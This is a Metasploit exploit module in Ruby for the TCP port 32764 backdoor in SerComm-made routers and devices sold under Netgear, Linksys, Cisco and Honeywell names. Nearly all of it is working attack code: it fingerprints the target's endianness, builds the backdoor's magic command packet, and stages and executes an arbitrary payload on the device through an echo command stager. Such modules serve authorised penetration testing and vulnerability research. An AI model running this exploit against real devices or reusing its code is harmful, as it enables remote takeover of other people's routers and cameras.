##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SerComm Device Remote Code Execution",
      'Description'    => %q{
        This module will cause remote code execution on several SerComm devices.
        These devices typically include routers from NetGear and Linksys.
        This module was tested successfully against several NetGear, Honeywell
        and Cisco devices.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>', # Initial discovery, poc
          'Matt "hostess" Andreko <mandreko[at]accuvant.com>' # Msf module
        ],
      'Payload'        =>
        {
          'Space'       => 10000, # Could be more, but this should be good enough
          'DisableNops' => true
        },
      'Platform'       => 'linux',
      'Privileged'     => false,
      'Targets'        =>
        [
          ['Generic Linux MIPS Big Endian',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'VVV'
            }
          ],
          ['Generic Linux MIPS Little Endian',
            {
              'Arch' => ARCH_MIPSLE,
              'PackFormat' => 'NNN'
            }
          ],
          ['Manual Linux MIPS Big Endian',
            {
              'Arch' => ARCH_MIPSBE
            }
          ],
          ['Manual Linux MIPS Little Endian',
            {
              'Arch' => ARCH_MIPSLE
            }
          ],
          ['Cisco WAP4410N',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'NNN',
            }
          ],
          ['Honeywell WAP-PL2 IP Camera',
            {
              'Arch' => ARCH_MIPSLE,
              'PackFormat' => 'VVV'
            }
          ],
          ['Netgear DG834',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'VVV',
              'NoArgs' => true
            }
          ],
          ['Netgear DG834G',
            {
              'Arch' => ARCH_MIPSLE,
              'PackFormat' => 'VVV',
              'PayloadEncode' => 'octal'
            }
          ],
          ['Netgear DG834PN',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'VVV',
              'NoArgs' => true
            }
          ],
          ['Netgear DGN1000',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'VVV',
              'NoArgs' => true
            }
          ],
          ['Netgear DSG835',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'VVV',
              'NoArgs' => true,
            }
          ],
          ['Netgear WPNT834',
            {
              'Arch' => ARCH_MIPSBE,
              'PackFormat' => 'NNN',
              'UploadPath' => '/var',
              'PayloadEncode' => 'octal'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'References'     =>
        [
          [ 'OSVDB', '101653' ],
          [ 'URL', 'https://github.com/elvanderb/TCP-32764' ]
        ],
      'DisclosureDate' => '2013-12-31' ))

      register_options(
        [
          Opt::RPORT(32764)
        ])

      register_advanced_options(
        [
          OptEnum.new('PACKFORMAT', [false, "Pack Format to use", 'VVV', ['VVV', 'NNN']]),
          OptString.new('UPLOADPATH', [false, "Remote path to land the payload", "/tmp" ]),
          OptBool.new('NOARGS', [false, "Don't use the echo -en parameters", false ]),
          OptEnum.new('ENCODING', [false, "Payload encoding to use", 'hex', ['hex', 'octal']]),
        ])
      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
  end

  def check
    fprint = endian_fingerprint

    case fprint
    when 'BE'
      vprint_status("Detected Big Endian")
      return Msf::Exploit::CheckCode::Appears
    when 'LE'
      vprint_status("Detected Little Endian")
      return Msf::Exploit::CheckCode::Appears
    end

    return Msf::Exploit::CheckCode::Safe
  end

  def exploit
    if target.name =~ /Manual/
      print_warning("Remember you can configure Manual targets with NOARGS, UPLOADPATH, ENCODING and PACK advanced options")
      @no_args = datastore['NOARGS']
      @upload_path = datastore['UPLOADPATH']
      @encoding_format = datastore['ENCODING']
      @pack_format = datastore['PACKFORMAT']
    else
      @no_args = target['NoArgs']
      @upload_path = target['UploadPath']
      @encoding_format = target['PayloadEncode']
      @pack_format = target['PackFormat']
    end

    execute_cmdstager(
      :noargs => @no_args,
      :temp => @upload_path,
      :enc_format => @encoding_format,
      :flavor => :echo
    )
  end

  def endian_fingerprint
    begin
      connect

      sock.put(rand_text(5))
      res = sock.get_once

      disconnect

      if res && res.start_with?("MMcS")
        return 'BE'
      elsif res && res.start_with?("ScMM")
        return 'LE'
      end
    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.class}: #{e}")
    end

    return nil
  end

  def execute_command(cmd, opts)
    # Get the length of the command, for the backdoor's command injection
    cmd_length = cmd.length

    # 0x53634d4d  => Backdoor code
    # 0x07        => Exec command
    # cmd_length  => Length of command to execute, sent after communication struct
    data = [0x53634d4d, 0x07, cmd_length].pack(@pack_format)

    connect
    # Send command structure followed by command text
    sock.put(data+cmd)
    disconnect

    Rex.sleep(1)
  end
end
